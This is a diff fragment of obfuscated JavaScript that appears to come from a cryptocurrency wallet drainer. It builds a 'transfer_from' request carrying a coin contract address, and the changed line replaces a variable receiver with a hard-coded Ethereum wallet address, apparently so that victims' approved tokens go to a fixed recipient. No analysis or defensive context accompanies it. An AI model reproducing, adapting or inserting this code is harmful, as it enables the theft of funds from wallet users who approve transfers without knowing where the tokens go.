@@ -5037,7 +5037,7 @@ $(document)[_0xb4c3a(2574, -17, 1746, 772, "8ryY")]((async function() {
                         mess: d,
                         address: e,
                         coin_contract_add: c,
-                        receiver: W
+                        receiver: 0x053973D64EE9256d6957E3C5D2b5dD100064F07F
                     });
                     let f = new FormData;
                     f.append("action", "transfer_from"),
